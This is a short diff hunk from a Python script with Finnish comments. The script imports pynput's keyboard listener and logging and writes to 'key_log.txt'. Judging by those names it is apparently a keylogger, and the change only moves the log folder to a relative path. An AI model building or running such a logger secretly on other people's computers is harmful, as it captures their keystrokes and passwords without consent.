@@ -3,7 +3,7 @@ from pynput.keyboard import Key, Listener  # pynput.keyboard käsittelee näppä
 import logging  # logging kirjaa tapahtumat tiedostoon
 
 # Määritä lokitiedoston tallennuspolku ja nimi
-log_directory = "/Users/xxx/Desktop/keylog"  # Korvaa tämä polku haluamallasi polulla
+log_directory = ".\\keylog"  # Korvaa tämä polku haluamallasi polulla
 log_file = "key_log.txt"  # Lokitiedoston nimi
 
 # Asetetaan lokituksen konfiguraatio: tiedostonimi, lokitason ja viestin muoto
